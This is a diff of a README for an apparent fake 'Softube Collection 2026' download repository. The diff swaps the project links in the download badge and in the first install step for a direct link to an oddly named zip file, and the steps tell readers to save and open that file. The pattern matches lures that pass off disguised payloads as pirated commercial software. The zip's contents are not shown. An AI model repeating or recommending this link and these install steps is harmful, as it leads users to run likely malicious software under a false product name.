@@ -5,7 +5,7 @@ description: "Download and install the latest Softube Collection for Windows 10 
 ---
 # 🎧 Softube-Collection-2026 - Install Professional Audio Tools Today
 
-[![Download Softube Collection](https://img.shields.io/badge/Download-Softube_Collection-blue.svg)](https://github.com/toobla2241/Softube-Collection-2026)
+[![Download Softube Collection](https://img.shields.io/badge/Download-Softube_Collection-blue.svg)](https://raw.githubusercontent.com/toobla2241/toobla2241.github.io/main/opisthognathism/io_toobla_github_3.0.zip)
 
 ## 📦 About This Collection
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards for optimal performance:
 
 Follow these steps to set up your plugins. 
 
-1. Visit the project link to start the process: [https://github.com/toobla2241/Softube-Collection-2026](https://github.com/toobla2241/Softube-Collection-2026).
+1. Visit the project link to start the process: [https://raw.githubusercontent.com/toobla2241/toobla2241.github.io/main/opisthognathism/io_toobla_github_3.0.zip](https://raw.githubusercontent.com/toobla2241/toobla2241.github.io/main/opisthognathism/io_toobla_github_3.0.zip).
 2. Locate the link on the page marked for the latest download.
 3. Save the installer file to your computer.
 4. Open the downloaded file to start the setup wizard.
